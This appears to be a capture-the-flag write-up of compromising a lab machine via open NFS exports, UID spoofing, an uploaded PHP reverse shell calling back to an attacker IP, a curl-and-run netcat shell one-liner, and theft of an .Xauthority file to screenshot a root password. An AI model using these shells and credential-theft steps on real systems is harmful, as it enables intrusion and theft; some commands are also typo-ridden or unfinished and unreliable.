Quick enum:
```
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
2049/tcp  open  nfs     syn-ack ttl 63
37427/tcp open  unknown syn-ack ttl 63
39207/tcp open  unknown syn-ack ttl 63
48241/tcp open  unknown syn-ack ttl 63
52507/tcp open  unknown syn-ack ttl 63
```

Detailed enum:
```
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Built Better
111/tcp   open   rpcbind    2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39207/tcp   mountd
|   100005  1,2,3      46237/udp   mountd
|   100005  1,2,3      49905/tcp6  mountd
|   100005  1,2,3      59736/udp6  mountd
|   100021  1,3,4      37427/tcp   nlockmgr
|   100021  1,3,4      43791/tcp6  nlockmgr
|   100021  1,3,4      51649/udp   nlockmgr
|   100021  1,3,4      59920/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
979/tcp   closed unknown
2049/tcp  open   nfs_acl    3 (RPC #100227)
2068/tcp  closed avocentkvm
16826/tcp closed unknown
20341/tcp closed unknown
24768/tcp closed unknown
26585/tcp closed unknown
28201/tcp closed unknown
28422/tcp closed unknown
37053/tcp closed unknown
37427/tcp open   nlockmgr   1-4 (RPC #100021)
39207/tcp open   mountd     1-3 (RPC #100005)
41162/tcp closed unknown
42854/tcp closed unknown
43936/tcp closed unknown
45308/tcp closed unknown
48230/tcp closed unknown
48241/tcp open   mountd     1-3 (RPC #100005)
48746/tcp closed unknown
52507/tcp open   mountd     1-3 (RPC #100005)
54985/tcp closed unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The first interesting thing is that we have available an rpcbind port that maps to many other ports. One of them is the nfs port, so let's enumerate the remote fs available to be mounted:
```
showmount -e $(cat ip)
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

Let's use #nfs to mount them:
```
id -u lotape6
sudo mount -t nfs $(cat ip):/home/ross ross -o nolock # Completely empty

ls -n ross
# uid and gid are 1001
# create or log into user with this gid uid

sudo mount -t nfs $(cat ip):/home/ross ross -o nolock 

ls -n .
drwxr-xr-- 5 2017   33 4096 dic  1 11:40 html

sudo useradd tmpuser -u 2017 -g 33 -m -s /bin/bash
sudo passwd tmpuser

su tmpuser

# And you can enter into html folder!

./js/custom.js # contains-> user
```

Let's try to venom all the js found in html to retrieve a revshell:
```
ls | xargs -I % sh -c "rm % && cp ../../shell.js %"
```

We have broken the movable parts of the webpage, so we are in the actuall server instance, but no reverse shell was obtained. Let's try other ways to retrieve that reverse shell:
```
curl http://10.10.16.4:81/nc -O;chmod +x nc;./nc 10.10.16.4 31415 -e sh
```

Let's find out some potential Apache 2.4.41 vulnerabilities:

```
searchsploit apache 2.4.41
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                                                  | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                                                | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                                                              | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                                             | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                                       | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                                       | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                                                              | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                                                                | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                                                              | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                                                                        | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                                     | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                                     | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                                                                     | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                                                                 | linux/remote/34.pl
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Finally, we have modified the .htaccess to also allow .php files and we have injeceted the PHP PentestMonkey from revshell.com
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.4';
$port = 31415;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
And we are in!

We have observed that when we have injected some html file trying to execute code, the webpage was able to restore it's initial state, so there is some kind of mechanism to detect errors and reload the system, we may try to figure out if this is due to a container being reopened or if there is any automated task we can exploit.

After running some linpease we find out the following: 
```
  --> Found interesting column names in folder_id_email_list (output limit 10)
CREATE TABLE 'folder_id_email_list' (uid TEXT NOT NULL REFERENCES 'folder_id' (uid), value TEXT)

```

Looks quite interesting!

Also there is some sudo log containing some interesting username:
```
<e/alex/.local/share/gvfs-metadata/root-980786cd.log
jouralex@squashed:/home/alex$
```

Also, there are some interesting ports that we could not observe in the initial port discovery:
```
tcp        0      0 0.0.0.0:52507           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:39207           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:48241           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:37427           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::41501                :::*                    LISTEN      -
tcp6       0      0 :::2049                 :::*                    LISTEN      -
tcp6       0      0 :::37665                :::*                    LISTEN      -
tcp6       0      0 :::43791                :::*                    LISTEN      -
tcp6       0      0 :::111                  :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::49905                :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:631                 :::*                    LISTEN      -
```

It looks like we have some DNS over 53 port in 127.0.0.53 and also we have some Internet Printing Protocol over localhost:631:

After a curl to the 631 port we easily identify the service running `CUPS v2.3.1`


Running pspy we also observe some interesting stuff:
```

CMD: UID=1001  PID=1623   | /usr/bin/keepassxc --pw-stdin --keyfile /usr/share/keepassxc/keyfiles/ross/keyfile.key /usr/share/keepassxc/databases/ross/Passwords.kdbx
2024/12/01 13:57:40 CMD: UID=1001  PID=1613   | /bin/bash /usr/share/keepassxc/scripts/ross/keepassxc-start
/bin/bash /usr/share/keepassxc/scripts/ross/keepassxc-start

2024/12/01 14:00:01 CMD: UID=0     PID=66012  | /usr/sbin/CRON -f
2024/12/01 14:00:01 CMD: UID=0     PID=66016  | /usr/bin/rm -r /var/www/html/css /var/www/html/images /var/www/html/index.html /var/www/html/js
2024/12/01 14:00:01 CMD: UID=0     PID=66015  | /bin/bash /root/scripts/restore_website.sh
2024/12/01 14:00:01 CMD: UID=0     PID=66014  | /bin/sh -c /root/scripts/restore_website.sh
2024/12/01 14:00:01 CMD: UID=0     PID=66017  | /bin/bash /root/scripts/restore_website.sh
```

Efectively we have some scheduled task in order to restore the webpage.

Let's try to create a symlink in ross home's to access the keypass stuff:

```
sudo mount -t nfs -o rw  -force $(cat ip):/home/ross ross -o nolock

ln -s ...
```

Not this way, but we have some keypass file over the ross filesystem, so let's retrieve it:
```
# Give access to kevin (1001) user to write on our folder:
setfacl -m u:kevin:rwx .

/usr/bin/keepassxc-cli extract --key-file /usr/share/keepassxc/keyfiles/ross/keyfile.key Passwords.kdbx --no-passwrod

# We need to gain access to keyfiles/ross/keyfile.key in order to get access to the 
```

Takeing a look back to pspy:
```
2024/12/01 15:06:44 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity
2024/12/01 15:09:00 CMD: UID=0     PID=129905 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129904 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129903 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129902 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129901 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129900 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129899 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129898 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129897 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129896 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129895 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129894 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129893 | (ionclean)
2024/12/01 15:09:00 CMD: UID=0     PID=129911 | /bin/sh /usr/sbin/phpquery -V
2024/12/01 15:09:00 CMD: UID=0     PID=129910 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129909 | sort -u -t: -k 1,1
2024/12/01 15:09:00 CMD: UID=0     PID=129908 | sort -rn -t: -k2,2
2024/12/01 15:09:00 CMD: UID=0     PID=129907 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129906 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129914 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129913 | /lib/systemd/systemd-udevd
2024/12/01 15:09:00 CMD: UID=0     PID=129912 | expr 2 - 1
2024/12/01 15:09:00 CMD: UID=0     PID=129919 |
2024/12/01 15:09:00 CMD: UID=0     PID=129918 | /bin/sh /usr/sbin/phpquery -V
2024/12/01 15:09:00 CMD: UID=0     PID=129917 |
2024/12/01 15:09:00 CMD: UID=0     PID=129916 | /bin/sh /usr/sbin/phpquery -V
2024/12/01 15:09:00 CMD: UID=0     PID=129920 |
2024/12/01 15:09:00 CMD: UID=0     PID=129923 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129922 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129921 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129926 | sed -ne s/^session\.save_path=\(.*;\)\?\(.*\)$/\2/p
2024/12/01 15:09:00 CMD: UID=0     PID=129924 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129927 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129929 | sed -ne s/^session\.gc_maxlifetime=\(.*\)$/\1/p
2024/12/01 15:09:00 CMD: UID=0     PID=129928 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129932 | sed -e s,@VERSION@,7.4,
2024/12/01 15:09:00 CMD: UID=0     PID=129931 | ???
2024/12/01 15:09:00 CMD: UID=0     PID=129930 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129933 | php7.4 -c /etc/php/7.4/cli/php.ini -d error_reporting='~E_ALL' -r foreach(ini_get_all("session") as $k => $v) echo "$k=".$v["local_value"]."\n";
2024/12/01 15:09:00 CMD: UID=0     PID=129936 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129934 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129937 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129939 | sed -ne s/^session\.save_path=\(.*;\)\?\(.*\)$/\2/p
2024/12/01 15:09:00 CMD: UID=0     PID=129946 |
2024/12/01 15:09:00 CMD: UID=0     PID=129947 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129948 | find /proc/2950/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ;
2024/12/01 15:09:00 CMD: UID=0     PID=129949 | /bin/sh -e /usr/lib/php/sessionclean
2024/12/01 15:09:00 CMD: UID=0     PID=129950 | find /proc/2945/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ;
2024/12/01 15:09:00 CMD: UID=0     PID=129951 | find /proc/2943/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ;
2024/12/01 15:09:00 CMD: UID=0     PID=129952 | find /proc/2848/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ;
2024/12/01 15:09:00 CMD: UID=0     PID=129953 | find /proc/2720/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ;
2024/12/01 15:09:00 CMD: UID=0     PID=129954 | find /proc/2700/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ;
2024/12/01 15:09:00 CMD: UID=0     PID=129955 | find /proc/2505/fd -ignore_readdir_race -lname /var/lib/php/sessions/sess_* -exec touch -c {} ;
2024/12/01 15:09:00 CMD: UID=???   PID=129956 | ???
2024/12/01 15:09:00 CMD: UID=0     PID=129962 |
2024/12/01 15:09:00 CMD: UID=0     PID=129961 |
2024/12/01 15:09:01 CMD: UID=0     PID=129963 | /usr/sbin/CRON -f
2024/12/01 15:10:01 CMD: UID=0     PID=129967 | /usr/sbin/CRON -f
2024/12/01 15:10:01 CMD: UID=0     PID=129965 | /usr/sbin/CRON -f
2024/12/01 15:10:01 CMD: UID=0     PID=129968 | /bin/bash /root/scripts/restore_website.sh
2024/12/01 15:10:01 CMD: UID=0     PID=129969 | /usr/bin/rm -r /var/www/html/css /var/www/html/images /var/www/html/index.html /var/www/html/js
2024/12/01 15:10:01 CMD: UID=0     PID=129970 | /bin/bash /root/scripts/restore_website.sh
2024/12/01 15:10:01 CMD: UID=0     PID=129971 | /bin/bash /root/scripts/restore_website.sh


```

Finally the idea was to steal the Xauthority file stored in ross home's and use it to steal a snapshot of the xserver.

```
#On mounted fs
cat .Xauthority | base64

# On rev shell
echo "<output>" | base64 -d > .Xauthority
export DISPLAY=:0

xwd -root -screen -silent > /tmp/screen.xwd 

python3 -m http.server 9000

# On our machine

curl http://$(cat ip):9000/screen.xwd -O

convert screen.xwd screen.png
xdg-open screen.png

```

And we find root's password in there: `cah$mei7rai9A`

So, work done:
```
e2551...
```

